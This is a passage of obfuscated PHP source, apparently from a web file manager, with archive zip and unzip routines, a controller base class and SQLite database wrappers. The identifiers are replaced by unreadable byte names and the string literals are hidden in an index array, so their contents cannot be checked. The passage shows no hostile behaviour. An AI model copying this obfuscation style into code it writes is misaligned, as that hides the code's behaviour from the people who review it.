(count($¾åâÀâ) >= $«·Â«›) { $¾åâÀâ = array_slice($¾åâÀâ, $«·Â«› * 0.5, $«·Â«›); } $¾åâÀâ[] = $–Ä§û¾É; write_log($ÃÄğßä[176] . ACTION . $ÃÄğßä[1246] . $–Ä§û¾É, $ÃÄğßä[1247]); } public static function getLastError($´ÙÊé½ = '') { $¸µÏš©£ = self::errorTips(-1); return $¸µÏš©£ ? $¸µÏš©£ : $´ÙÊé½; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¢°É³™Š; if ($¢°É³™Š) { return $¢°É³™Š; } $öãä–ó® = IO::init($_SERVER[£ğ°ÖØø][8]); return $öãä–ó®; } private static function iconvSystem($Áıê¸“ù) { return self::local()->iconvSystem($Áıê¸“ù); } private static function iconvApp($µ½‚×ïò) { return self::local()->iconvApp($µ½‚×ïò); } public static function zipFolder($Î÷æÛåï, $Í‚á»˜ü = "\172\x69\x70", $ìåë£¤õ = '', $Í›Íş² = REPEAT_RENAME) { $â¥ÄÍ·­ =& $_SERVER[£ğ°ÖØø]; $¿®ÎãÓ = IO::listPath($Î÷æÛåï); if (!$¿®ÎãÓ) { return !1; } $¿®ÎãÓ = array_merge($¿®ÎãÓ[$â¥ÄÍ·­[85]], $¿®ÎãÓ[$â¥ÄÍ·­[86]]); return self::zip($¿®ÎãÓ, $Í‚á»˜ü, $ìåë£¤õ, $Í›Íş²); } public static function zip($‹Û‡²¤, $ŞŞ£¶¢ = "\172\151\160", $•å©ì¼× = '', $œ‡äÈæÑ = REPEAT_RENAME) { $—Ÿùá²Î =& $_SERVER[£ğ°ÖØø]; if (is_string($‹Û‡²¤) && $‹Û‡²¤) { $‹Û‡²¤ = array(array($—Ÿùá²Î[87] => $‹Û‡²¤)); } $³Ò€‘ÏÏ = self::init($‹Û‡²¤[0][$—Ÿùá²Î[87]]); $ñ¡çç¿ = self::info($‹Û‡²¤[0][$—Ÿùá²Î[87]]); $§ç¹ï = $—Ÿùá²Î[12]; $¶İİŠèß = $—Ÿùá²Î[12]; $Ï¨ïèøè = $—Ÿùá²Î[12]; if ($•å©ì¼× && substr($•å©ì¼×, -1, 1) != $—Ÿùá²Î[8]) { $¶İİŠèß = get_path_father($•å©ì¼×); $Ï¨ïèøè = get_path_this($•å©ì¼×); } else { $¶İİŠèß = self::pathFather($ñ¡çç¿[$—Ÿùá²Î[87]]); $Ï¨ïèøè = $ñ¡çç¿[$—Ÿùá²Î[32]] . $—Ÿùá²Î[10] . $ŞŞ£¶¢; if (count($‹Û‡²¤) > 1) { $Õ‰¬’ù = IO::info($¶İİŠèß); $Ï¨ïèøè = $Õ‰¬’ù[$—Ÿùá²Î[32]] . $—Ÿùá²Î[10] . $ŞŞ£¶¢; } if ($•å©ì¼×) { $¶İİŠèß = $•å©ì¼×; } } if ($³Ò€‘ÏÏ->getType() == $—Ÿùá²Î[109]) { $¢³÷òË… = self::init($¶İİŠèß); $¡ÈÈæçù = $¢³÷òË…->getType() == $—Ÿùá²Î[109] ? $¶İİŠèß : get_path_father($³Ò€‘ÏÏ->path); $¡ÈÈæçù = rtrim($¡ÈÈæçù, $—Ÿùá²Î[8]) . $—Ÿùá²Î[8]; mk_dir($¡ÈÈæçù); } else { $§ç¹ï = TEMP_FILES . $—Ÿùá²Î[1248] . time() . rand_string(8) . $—Ÿùá²Î[8]; mk_dir($§ç¹ï); file_put_contents($§ç¹ï . $—Ÿùá²Î[1249], $—Ÿùá²Î[12]); $¡ÈÈæçù = $§ç¹ï; } $²º•¢Ú€ = IO::info($¡ÈÈæçù); if (!$²º•¢Ú€ || !$²º•¢Ú€[$—Ÿùá²Î[233]]) { show_json(LNG($—Ÿùá²Î[1250]), !1); } $šŞ“¹ó¡ = self::zipFileList($‹Û‡²¤, $§ç¹ï); foreach ($šŞ“¹ó¡ as $ûöÁÇ­œ => $€«¼‹Ÿì) { $šŞ“¹ó¡[$ûöÁÇ­œ] = self::iconvSystem($€«¼‹Ÿì); } $½ˆ—¾–Õ = get_filename_auto($¡ÈÈæçù . $Ï¨ïèøè, $—Ÿùá²Î[12], $œ‡äÈæÑ); KodArchive::create(self::iconvSystem($½ˆ—¾–Õ), $šŞ“¹ó¡); if (!IO::exist($½ˆ—¾–Õ)) { if ($§ç¹ï) { del_dir($§ç¹ï); } write_log($—Ÿùá²Î[1251] . $½ˆ—¾–Õ, $—Ÿùá²Î[389]); show_json(LNG($—Ÿùá²Î[1252]), !1); } if (!$§ç¹ï) { return $½ˆ—¾–Õ; } $ßÌ‡áÕæ = self::move($½ˆ—¾–Õ, $¶İİŠèß, $œ‡äÈæÑ); if ($§ç¹ï) { del_dir($§ç¹ï); } if (!$½ˆ—¾–Õ) { write_log($—Ÿùá²Î[1253] . $½ˆ—¾–Õ . $—Ÿùá²Î[1254] . $¶İİŠèß, $—Ÿùá²Î[389]); show_json(LNG($—Ÿùá²Î[1252]), !1); } return $ßÌ‡áÕæ; } public static function unzip($‹ÒŒ¨ªğ, $ÑÔ™ÙÂå, $¹¶³ÍÊ = "\x2d\61", $µæØÉ°Ü = "\162\x65\x70\154\141\x63\145") { $¼¸¾ç¨† =& $_SERVER[£ğ°ÖØø]; $ö¤ú£ë¦ = parent::info($‹ÒŒ¨ªğ); if (!$ö¤ú£ë¦) { show_json(LNG($¼¸¾ç¨†[1255]), !1); } $½ˆÄ¹™· = IO::infoFullSimple($ÑÔ™ÙÂå); if (!$½ˆÄ¹™·) { $ÑÔ™ÙÂå = IO::mkdir($ÑÔ™ÙÂå); } if (isset($½ˆÄ¹™·[$¼¸¾ç¨†[193]]) && trim($½ˆÄ¹™·[$¼¸¾ç¨†[87]], $¼¸¾ç¨†[8]) != trim($ÑÔ™ÙÂå, $¼¸¾ç¨†[8])) { $»¨‰»¶ = KodIO::make($½ˆÄ¹™·[$¼¸¾ç¨†[192]]); $™ıÙ·Ó„ = IO::fileNameAuto($»¨‰»¶, $½ˆÄ¹™·[$¼¸¾ç¨†[32]], REPEAT_RENAME_FOLDER, !0); $ÑÔ™ÙÂå = IO::mkdir($»¨‰»¶ . $™ıÙ·Ó„); } $¹¶³ÍÊ = $¹¶³ÍÊ && $¹¶³ÍÊ != $¼¸¾ç¨†[1256] ? @json_decode($¹¶³ÍÊ, !0) : -1; $İ¥±ïÆÕ = self::unzipPart($‹ÒŒ¨ªğ, $¹¶³ÍÊ); if (!$İ¥±ïÆÕ || !IO::exist($İ¥±ïÆÕ[$¼¸¾ç¨†[230]])) { show_json(LNG($¼¸¾ç¨†[108]), !1); } $áú¿È€Â = $İ¥±ïÆÕ[$¼¸¾ç¨†[1257]][count($İ¥±ïÆÕ[$¼¸¾ç¨†[1257]]) - 1]; if ($áú¿È€Â[$¼¸¾ç¨†[1258]] == -1 || substr($áú¿È€Â[$¼¸¾ç¨†[32]], -1, 1) == $¼¸¾ç¨†[8]) { $ò¢Éº  = $İ¥±ïÆÕ[$¼¸¾ç¨†[1259]] . rand_string(10) . $¼¸¾ç¨†[8]; mk_dir($ò¢Éº ); $Õ‡Ê›°Õ = count($İ¥±ïÆÕ[$¼¸¾ç¨†[1257]]) == 1 ? IO::ext($‹ÒŒ¨ªğ) : get_path_ext($İ¥±ïÆÕ[$¼¸¾ç¨†[230]]); $ÍÊÎ¤«Æ = KodArchive::extract(self::iconvSystem($İ¥±ïÆÕ[$¼¸¾ç¨†[230]]), $ò¢Éº , $áú¿È€Â[$¼¸¾ç¨†[1258]], $™ıÙ·Ó„, $Õ‡Ê›°Õ); self::unzipErrorCheck($ÍÊÎ¤«Æ, array($¼¸¾ç¨†[1260], $‹ÒŒ¨ªğ, $Õ‡Ê›°Õ, $ÑÔ™ÙÂå, $İ¥±ïÆÕ)); Hook::trigger($¼¸¾ç¨†[1261], $ò¢Éº ); recursion_dir($ò¢Éº , $ô¶Ä…â£, $‘´÷‹ï, 0); $ƒì½Ö¤Ğ = array_merge($ô¶Ä…â£, $‘´÷‹ï); $ışıÁ•ı = array(); foreach ($ƒì½Ö¤Ğ as $šÎŠÃµ) { $²‘§©éˆ = IO::move(self::iconvApp($šÎŠÃµ), $ÑÔ™ÙÂå, $µæØÉ°Ü); if ($²‘§©éˆ) { $ışıÁ•ı[] = $²‘§©éˆ; } } del_dir($ò¢Éº ); } else { $²‘§©éˆ = IO::move($İ¥±ïÆÕ[$¼¸¾ç¨†[230]], $ÑÔ™ÙÂå, $µæØÉ°Ü, get_path_this($áú¿È€Â[$¼¸¾ç¨†[32]])); if ($²‘§©éˆ) { $ışıÁ•ı[] = $²‘§©éˆ; } } return $ışıÁ•ı ? $ışıÁ•ı : !1; } public static function unzipList($îê´¨«²) { $ã•˜î÷ =& $_SERVER[£ğ°ÖØø]; $¼šÅ ª = isset($îê´¨«²[$ã•˜î÷[1262]]) ? $îê´¨«²[$ã•˜î÷[1262]] : !1; $¾¾°»‘À = isset($îê´¨«²[$ã•˜î÷[1258]]) ? @json_decode($îê´¨«²[$ã•˜î÷[1258]], !0) : -1; $É”ØŠ½î = self::unzipPart($îê´¨«²[$ã•˜î÷[87]], $¾¾°»‘À); if (!$É”ØŠ½î || !IO::exist($É”ØŠ½î[$ã•˜î÷[230]])) { show_json(LNG($ã•˜î÷[108]), !1); } $†Ø¾¡¾´ = $É”ØŠ½î[$ã•˜î÷[1257]][count($É”ØŠ½î[$ã•˜î÷[1257]]) - 1]; $Ç»Üşöè = in_array(IO::ext($É”ØŠ½î[$ã•˜î÷[230]]), array($ã•˜î÷[389], $ã•˜î÷[1263], $ã•˜î÷[1264], $ã•˜î÷[1265], $ã•˜î÷[1266], $ã•˜î÷[1267])); if (!$¼šÅ ª && ($†Ø¾¡¾´[$ã•˜î÷[1258]] == -1 || $Ç»Üşöè)) { $€¸Šå¼ª = $É”ØŠ½î[$ã•˜î÷[1259]] . get_path_this($É”ØŠ½î[$ã•˜î÷[230]]) . $ã•˜î÷[1268]; if (!IO::exist($€¸Šå¼ª)) { $™ş£¶­ó = $†Ø¾¡¾´[$ã•˜î÷[1258]] == -1 ? get_path_ext(IO::pathThis($îê´¨«²[$ã•˜î÷[87]])) : get_path_ext($É”ØŠ½î[$ã•˜î÷[230]]); $¥ßıœÚ… = KodArchive::listContent(self::iconvSystem($É”ØŠ½î[$ã•˜î÷[230]]), !0, $™ş£¶­ó); self::unzipErrorCheck($¥ßıœÚ…, array($ã•˜î÷[1269], $îê´¨«², $É”ØŠ½î)); @file_put_contents($€¸Šå¼ª, json_encode($¥ßıœÚ…[$ã•˜î÷[1270]])); } return @json_decode(IO::getContent($€¸Šå¼ª), !0); } IO::fileOut($É”ØŠ½î[$ã•˜î÷[230]], $¼šÅ ª, get_path_this($†Ø¾¡¾´[$ã•˜î÷[32]])); die; } private static function zipFileList($‘” ¤¨¹, $²§ €Ï£ = false) { $«ã¼ËˆÉ =& $_SERVER[£ğ°ÖØø]; $­Íòö” = array(); foreach ($‘” ¤¨¹ as $Í”ÂØÊõ) { $èŒæ¸ì = $Í”ÂØÊõ[$«ã¼ËˆÉ[87]]; if ($²§ €Ï£) { $èŒæ¸ì = self::copy($Í”ÂØÊõ[$«ã¼ËˆÉ[87]], $²§ €Ï£, $«ã¼ËˆÉ[882]); } else { $Ï™÷üËØ = self::init($Í”ÂØÊõ[$«ã¼ËˆÉ[87]]); if ($Ï™÷üËØ->getType() == $«ã¼ËˆÉ[109]) { $èŒæ¸ì = $Ï™÷üËØ->path; } } if ($èŒæ¸ì && self::local()->exist($èŒæ¸ì)) { $­Íòö”[$Í”ÂØÊõ[$«ã¼ËˆÉ[87]]] = $èŒæ¸ì; } } if (!empty($­Íòö”)) { return array_values($­Íòö”); } show_json(LNG($«ã¼ËˆÉ[1229]), !1); } private static function localFilePath($¨ÛŠ©¿é) { $üê—ÎÊ¥ =& $_SERVER[£ğ°ÖØø]; $Ê¤½¸şŠ = KodIO::parse($¨ÛŠ©¿é); if ($Ê¤½¸şŠ[$üê—ÎÊ¥[33]] == KodIO::KOD_SOURCE) { $³ƒî€ıö = Model($üê—ÎÊ¥[888])->fileInfoGet(KodIO::sourceID($¨ÛŠ©¿é)); if (!$³ƒî€ıö[$üê—ÎÊ¥[87]]) { show_json($üê—ÎÊ¥[1271], !1); } $¨ÛŠ©¿é = $³ƒî€ıö[$üê—ÎÊ¥[87]]; } $æıé»”Â = self::init($¨ÛŠ©¿é); if ($æıé»”Â->pathParse[$üê—ÎÊ¥[1215]]) { $¨ÛŠ©¿é = $æıé»”Â->pathParse[$üê—ÎÊ¥[1215]]; $æıé»”Â = self::init($¨ÛŠ©¿é); } $Á‹Ó€ø± = $æıé»”Â->getType(); if ($Á‹Ó€ø± == $üê—ÎÊ¥[109] || $Á‹Ó€ø± == $üê—ÎÊ¥[1272]) { if (!$æıé»”Â->exist($æıé»”Â->path)) { show_json(LNG($üê—ÎÊ¥[108]), !1); } return $æıé»”Â->path; } return !1; } public static function unzipPart($–„ñÁÏ, $íüÉŞÁó = -1) { $”ÄŒ‹ËÂ =& $_SERVER[£ğ°ÖØø]; $Ş÷Î¥›¤ = IO::pathThis($–„ñÁÏ); if (!$íüÉŞÁó || $íüÉŞÁó == -1) { $²îéªÏƒ = array(array($”ÄŒ‹ËÂ[32] => $Ş÷Î¥›¤, $”ÄŒ‹ËÂ[1258] => -1)); $²îéªÏƒ[0][$”ÄŒ‹ËÂ[1273]] = $²îéªÏƒ[0][$”ÄŒ‹ËÂ[32]]; } else { if (is_array($íüÉŞÁó)) { $²îéªÏƒ = $íüÉŞÁó; $¦öà¿¹ = count($²îéªÏƒ) - 1; for ($ªÌÂçêì = 0; $ªÌÂçêì <= $¦öà¿¹; $ªÌÂçêì++) { $Ã®ÕÃº = $²îéªÏƒ[$ªÌÂçêì]; $‚ß´ãÛÎ = get_path_this($Ã®ÕÃº[$”ÄŒ‹ËÂ[32]]) . (checkExtSafe($Ã®ÕÃº[$”ÄŒ‹ËÂ[32]]) ? $”ÄŒ‹ËÂ[12] : $”ÄŒ‹ËÂ[1274]); $²îéªÏƒ[$ªÌÂçêì][$”ÄŒ‹ËÂ[1273]] = $”ÄŒ‹ËÂ[1275] . intval($Ã®ÕÃº[$”ÄŒ‹ËÂ[1258]]) . $”ÄŒ‹ËÂ[471] . $‚ß´ãÛÎ; if ($ªÌÂçêì == 0) { continue; } $²îéªÏƒ[$ªÌÂçêì][$”ÄŒ‹ËÂ[1273]] = $²îéªÏƒ[$ªÌÂçêì - 1][$”ÄŒ‹ËÂ[1273]] . $”ÄŒ‹ËÂ[1276] . $²îéªÏƒ[$ªÌÂçêì][$”ÄŒ‹ËÂ[1273]]; } } } if (!is_array($²îéªÏƒ) || count($²îéªÏƒ) == 0) { return !1; } $ ¦å´ñ = $²îéªÏƒ[count($²îéªÏƒ) - 1]; if (!IO::exist($–„ñÁÏ)) { return !1; } $²¥Ğ¹ã = TEMP_FILES . $”ÄŒ‹ËÂ[1277] . kodIO::hashPathSafe($–„ñÁÏ) . $”ÄŒ‹ËÂ[8]; $‘ú¨Ñ™ = $²¥Ğ¹ã . $ ¦å´ñ[$”ÄŒ‹ËÂ[1273]]; mk_dir($²¥Ğ¹ã); file_put_contents(TEMP_FILES . $”ÄŒ‹ËÂ[1249], $”ÄŒ‹ËÂ[12]); if (IO::exist($‘ú¨Ñ™)) { return array($”ÄŒ‹ËÂ[230] => $‘ú¨Ñ™, $”ÄŒ‹ËÂ[1257] => $²îéªÏƒ, $”ÄŒ‹ËÂ[1259] => $²¥Ğ¹ã); } $ëÎöƒ´• = self::localFilePath($–„ñÁÏ); if (!$ëÎöƒ´•) { $ëÎöƒ´• = $²¥Ğ¹ã . $”ÄŒ‹ËÂ[1278]; if (!IO::exist($ëÎöƒ´•)) { self::copy($–„ñÁÏ, $²¥Ğ¹ã, !1, get_path_this($ëÎöƒ´•)); } } if (!$ëÎöƒ´• || !IO::exist($ëÎöƒ´•)) { return !1; } if ($ ¦å´ñ[$”ÄŒ‹ËÂ[1258]] == -1) { return array($”ÄŒ‹ËÂ[230] => $ëÎöƒ´•, $”ÄŒ‹ËÂ[1257] => $²îéªÏƒ, $”ÄŒ‹ËÂ[1259] => $²¥Ğ¹ã); } $”â±Ë§ñ = $ëÎöƒ´•; foreach ($²îéªÏƒ as $ªÌÂçêì => $Ã®ÕÃº) { if (!$Ã®ÕÃº || $Ã®ÕÃº[$”ÄŒ‹ËÂ[1258]] == $”ÄŒ‹ËÂ[1256]) { break; } if (substr($Ã®ÕÃº[$”ÄŒ‹ËÂ[32]], -1, 1) == $”ÄŒ‹ËÂ[8]) { break; } $Ã•£Éä‘ = in_array(get_path_ext($Ã®ÕÃº[$”ÄŒ‹ËÂ[1273]]), array($”ÄŒ‹ËÂ[389], $”ÄŒ‹ËÂ[1263], $”ÄŒ‹ËÂ[1264], $”ÄŒ‹ËÂ[1265], $”ÄŒ‹ËÂ[1266], $”ÄŒ‹ËÂ[1267])); $ ƒ¤“¯ = $ªÌÂçêì == count($²îéªÏƒ) - 1 && $Ã•£Éä‘; $‘»ë×ÌÈ = $²¥Ğ¹ã . $Ã®ÕÃº[$”ÄŒ‹ËÂ[1273]]; $Ù³¼ë¢ˆ = $²¥Ğ¹ã . get_path_this($Ã®ÕÃº[$”ÄŒ‹ËÂ[32]]); if (IO::exist($‘»ë×ÌÈ)) { $”â±Ë§ñ = $‘»ë×ÌÈ; continue; } $Öà—±“³ = $ªÌÂçêì == 0 ? get_path_ext($Ş÷Î¥›¤) : get_path_ext($”â±Ë§ñ); $ğ§¿ˆÄÊ = KodArchive::extract(self::iconvSystem($”â±Ë§ñ), $²¥Ğ¹ã, $Ã®ÕÃº[$”ÄŒ‹ËÂ[1258]], $şèÁ…ÈË, $Öà—±“³); self::unzipErrorCheck($ğ§¿ˆÄÊ, array($”ÄŒ‹ËÂ[1279], $–„ñÁÏ, $²îéªÏƒ, $Ã®ÕÃº, $‘»ë×ÌÈ)); if (IO::exist($Ù³¼ë¢ˆ)) { IO::rename($Ù³¼ë¢ˆ, get_path_this($‘»ë×ÌÈ)); } $”â±Ë§ñ = $‘»ë×ÌÈ; } $‘ú¨Ñ™ = $”â±Ë§ñ; return array($”ÄŒ‹ËÂ[230] => $”â±Ë§ñ, $”ÄŒ‹ËÂ[1257] => $²îéªÏƒ, $”ÄŒ‹ËÂ[1259] => $²¥Ğ¹ã); } private static function unzipErrorCheck($Îšø­õŠ, $ÜŞÀµøä = false) { $Ä‹¦â€ƒ =& $_SERVER[£ğ°ÖØø]; if ($Îšø­õŠ[$Ä‹¦â€ƒ[1280]]) { return !0; } write_log(array($Ä‹¦â€ƒ[1281], $Îšø­õŠ, $ÜŞÀµøä), $Ä‹¦â€ƒ[1282]); show_json($Ä‹¦â€ƒ[1283] . json_encode($Îšø­õŠ[$Ä‹¦â€ƒ[1270]]), !1); die; } } goto D·­Š§‡¬Á; d±Œ·¹¾‘‘: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $œüú½‘ò =& $_SERVER[£ğ°ÖØø]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$œüú½‘ò[6]] =& $config; $this->values[$œüú½‘ò[7]] =& $in; $this->tpl = TEMPLATE . MOD . $œüú½‘ò[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ø¶õ°Ó–) { if (1 === func_num_args()) { $this->{$Ø¶õ°Ó–} = new $Ø¶õ°Ó–(); } else { $Ü´­„«¶ = new ReflectionClass($Ø¶õ°Ó–); $ä©€èŞ› = func_get_args(); array_shift($ä©€èŞ›); $this->{$Ø¶õ°Ó–} = $Ü´­„«¶->newInstanceArgs($ä©€èŞ›); } return $this->{$Ø¶õ°Ó–}; } public function routeBind($¼¸‘Åé¥, $£ş¹©ø‰, $øÚöÓùÉ = 3) { $ˆãµê»Œ =& $_SERVER[£ğ°ÖØø]; $ÍÚ‚ÎØ’ = $this->in[$ˆãµê»Œ[9]]; $¼¸‘Åé¥ = str_replace($ˆãµê»Œ[10], $ˆãµê»Œ[11], trim(trim($¼¸‘Åé¥, $ˆãµê»Œ[8]), $ˆãµê»Œ[12])); if (!$¼¸‘Åé¥ || count($ÍÚ‚ÎØ’) <= $øÚöÓùÉ) { return !1; } $“®Œ”åı = !0; $Ûº†şâõ = explode($ˆãµê»Œ[8], $¼¸‘Åé¥); for ($‹ø÷ìĞ¢ = 0; $‹ø÷ìĞ¢ < count($Ûº†şâõ); $‹ø÷ìĞ¢++) { if ($Ûº†şâõ[$‹ø÷ìĞ¢] != $ÍÚ‚ÎØ’[$øÚöÓùÉ + $‹ø÷ìĞ¢]) { $“®Œ”åı = !1; break; } } if (!$“®Œ”åı) { return; } call_user_func_array(array($this, $£ş¹©ø‰), array()); } public function routeArgs($íö¹ıïå = 3) { $É‘Ğ„­™ = $this->in[$_SERVER[£ğ°ÖØø][9]]; if (count($É‘Ğ„­™) <= $íö¹ıïå) { return array(); } $Öõúƒˆ› = array(); for ($´‘ş¨µ = $íö¹ıïå; $´‘ş¨µ < count($É‘Ğ„­™); $´‘ş¨µ += 2) { $Öõúƒˆ›[$É‘Ğ„­™[$´‘ş¨µ]] = $É‘Ğ„­™[$´‘ş¨µ + 1]; $this->in[$É‘Ğ„­™[$´‘ş¨µ]] = $É‘Ğ„­™[$´‘ş¨µ + 1]; } return $Öõúƒˆ›; } protected function assign($ß®Á­´, $Ûá«ıÁÜ) { $this->values[$ß®Á­´] = $Ûá«ıÁÜ; } protected function display($¾ÊöÅâÕ) { ob_end_clean(); extract($this->values); require $this->tpl . $¾ÊöÅâÕ; } } class DbSqliteBase extends Db { public function __construct($Ôøàü¡‹ = '') { $ù‘Î“ÎÒ =& $_SERVER[£ğ°ÖØø]; if (!extension_loaded($ù‘Î“ÎÒ[13])) { think_exception(think_lang($ù‘Î“ÎÒ[14]) . $ù‘Î“ÎÒ[15]); } if (!empty($Ôøàü¡‹)) { if (!isset($Ôøàü¡‹[$ù‘Î“ÎÒ[16]])) { $Ôøàü¡‹[$ù‘Î“ÎÒ[16]] = 438; } $this->config = $Ôøàü¡‹; if (empty($this->config[$ù‘Î“ÎÒ[17]])) { $this->config[$ù‘Î“ÎÒ[17]] = array(); } } } public function connect($ƒ°ÙÓÎæ = '', $Æœ¿¤­ö = 0) { $ş¿Ã¨ =& $_SERVER[£ğ°ÖØø]; if (!isset($this->linkID[$Æœ¿¤­ö])) { if (empty($ƒ°ÙÓÎæ)) { $ƒ°ÙÓÎæ = $this->config; } $ğˆøåªÅ = !empty($ƒ°ÙÓÎæ[$ş¿Ã¨[17]][$ş¿Ã¨[18]]) ? $ƒ°ÙÓÎæ[$ş¿Ã¨[17]][$ş¿Ã¨[18]] : $this->pconnect; $úÖ¥Û = $ğˆøåªÅ ? $ş¿Ã¨[19] : $ş¿Ã¨[20]; $this->linkID[$Æœ¿¤­ö] = $úÖ¥Û($ƒ°ÙÓÎæ[$ş¿Ã¨[21]], $ƒ°ÙÓÎæ[$ş¿Ã¨[16]]); if (!$this->linkID[$Æœ¿¤­ö]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Æœ¿¤­ö], 30000); if (1 != think_config($ş¿Ã¨[22])) { unset($this->config); } } return $this->linkID[$Æœ¿¤­ö]; } public function free() { $this->queryID = null; } public function query($ÌŠØ·ÛÓ) { $·„’è™– =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌŠØ·ÛÓ; if ($this->queryID) { $this->free(); } think_action_status($·„’è™–[23], 1); think_status($·„’è™–[24]); $this->queryID = sqlite_query($this->_linkID, $ÌŠØ·ÛÓ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ñ­´ùŒƒ = $this->getAll(); return $Ñ­´ùŒƒ; } } public function execute($õÎµ…şü) { $³ ö–Ğ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $õÎµ…şü; if ($this->queryID) { $this->free(); } think_action_status($³ ö–Ğ[25], 1); think_status($³ ö–Ğ[24]); $å†€Òö = sqlite_exec($this->_linkID, $õÎµ…şü); $this->debug(); if (!1 === $å†€Òö) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[£ğ°ÖØø][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æÔáÎèÚ = sqlite_query($this->_linkID, $_SERVER[£ğ°ÖØø][27]); if (!$æÔáÎèÚ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÇĞÙ±¯ = sqlite_query($this->_linkID, $_SERVER[£ğ°ÖØø][28]); if (!$ÇĞÙ±¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $îîÜ˜ĞÍ = array(); if ($this->numRows > 0) { for ($®³Ø¦— = 0; $®³Ø¦— < $this->numRows; $®³Ø¦—++) { $îîÜ˜ĞÍ[$®³Ø¦—] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $îîÜ˜ĞÍ; } public function getFields($‚‘îÖ) { $˜œîóÅÎ =& $_SERVER[£ğ°ÖØø]; $¬ÍáşÑÆ = $this->query($˜œîóÅÎ[29] . $‚‘îÖ . $˜œîóÅÎ[30]); $Ôã•™ş² = array(); if ($¬ÍáşÑÆ) { foreach ($¬ÍáşÑÆ as $†ºå“é¦ => $‡Ù¼Ñ†Ü) { $Ôã•™ş²[$‡Ù¼Ñ†Ü[$˜œîóÅÎ[31]]] = array($˜œîóÅÎ[32] => $‡Ù¼Ñ†Ü[$˜œîóÅÎ[31]], $˜œîóÅÎ[33] => $‡Ù¼Ñ†Ü[$˜œîóÅÎ[34]], $˜œîóÅÎ[35] => (bool) ($‡Ù¼Ñ†Ü[$˜œîóÅÎ[36]] === $˜œîóÅÎ[12]), $˜œîóÅÎ[37] => $‡Ù¼Ñ†Ü[$˜œîóÅÎ[38]], $˜œîóÅÎ[39] => strtolower($‡Ù¼Ñ†Ü[$˜œîóÅÎ[40]]) == $˜œîóÅÎ[41], $˜œîóÅÎ[42] => strtolower($‡Ù¼Ñ†Ü[$˜œîóÅÎ[43]]) == $˜œîóÅÎ[44]); } } return $Ôã•™ş²; } public function getTables($ª“öÓ€ä = '') { $©ó¸¾Õ‰ =& $_SERVER[£ğ°ÖØø]; $û‡¾ÆÌ… = $this->query($©ó¸¾Õ‰[45] . $©ó¸¾Õ‰[46] . $©ó¸¾Õ‰[47]); $û¼¢ñĞ = array(); foreach ($û‡¾ÆÌ… as $¥¿«Á• => $“ã‚Œíà) { $û¼¢ñĞ[$¥¿«Á•] = current($“ã‚Œíà); } return $û¼¢ñĞ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¢µµÅ˜¢ =& $_SERVER[£ğ°ÖØø]; $š§…ŸÃ¼ = sqlite_last_error($this->_linkID); $this->error = $š§…ŸÃ¼ . $¢µµÅ˜¢[4] . sqlite_error_string($š§…ŸÃ¼); if ($¢µµÅ˜¢[12] != $this->queryStr) { $this->error .= LNG($¢µµÅ˜¢[48]) . $this->queryStr; } think_trace($this->error, $¢µµÅ˜¢[12], $¢µµÅ˜¢[49]); return $this->error; } public function escapeString($¤„à¯¹) { return sqlite_escape_string($¤„à¯¹); } public function parseLimit($î¿ŞÁÛ) { $ºäëÕŸü =& $_SERVER[£ğ°ÖØø]; $üÑÍÛÀ = $ºäëÕŸü[12]; if (!empty($î¿ŞÁÛ)) { $î¿ŞÁÛ = explode($ºäëÕŸü[50], $î¿ŞÁÛ); if (count($î¿ŞÁÛ) > 1) { $üÑÍÛÀ .= $ºäëÕŸü[51] . $î¿ŞÁÛ[1] . $ºäëÕŸü[52] . $î¿ŞÁÛ[0] . $ºäëÕŸü[53]; } else { $üÑÍÛÀ .= $ºäëÕŸü[51] . $î¿ŞÁÛ[0] . $ºäëÕŸü[53]; } } return $üÑÍÛÀ; } } class DbSqlite3Base extends Db { public function __construct($‚¯ğå®– = '') { $¾×È’˜Ç =& $_SERVER[£ğ°ÖØø]; if (!class_exists($¾×È’˜Ç[54])) { think_exception(think_lang($¾×È’˜Ç[14]) . $¾×È’˜Ç[55]); } if (!empty($‚¯ğå®–)) { if (!isset($‚¯ğå®–[$¾×È’˜Ç[16]])) { $‚¯ğå®–[$¾×È’˜Ç[16]] = 438; } $this->config = $‚¯ğå®–; if (empty($this->config[$¾×È’˜Ç[17]])) { $this->config[$¾×È’˜Ç[17]] = array(); } } } public function connect($Ğ®À½Ú = '', $ç­º‡ß = 0) { $Ø¥ÆáÚÍ =& $_SERVER[£ğ°ÖØø]; if (!isset($this->linkID[$ç­º‡ß])) { if (empty($Ğ®À½Ú)) { $Ğ®À½Ú = $this->config; } $this->linkID[$ç­º‡ß] = new SQLite3($Ğ®À½Ú[$Ø¥ÆáÚÍ[21]]); if (!$this->linkID[$ç­º‡ß]) { think_exception($this->linkID[$ç­º‡ß]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ç­º‡ß]->busyTimeout(30000); if (1 != think_config($Ø¥ÆáÚÍ[22])) { unset($this->config); } } return $this->linkID[$ç­º‡ß]; } public function free() { $this->queryID = null; } public function query($ûÙ´Ûº) { $€Œ‰ÇŞ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ûÙ´Ûº; if ($this->queryID) { $this->free(); } think_action_status($€Œ‰ÇŞ[23], 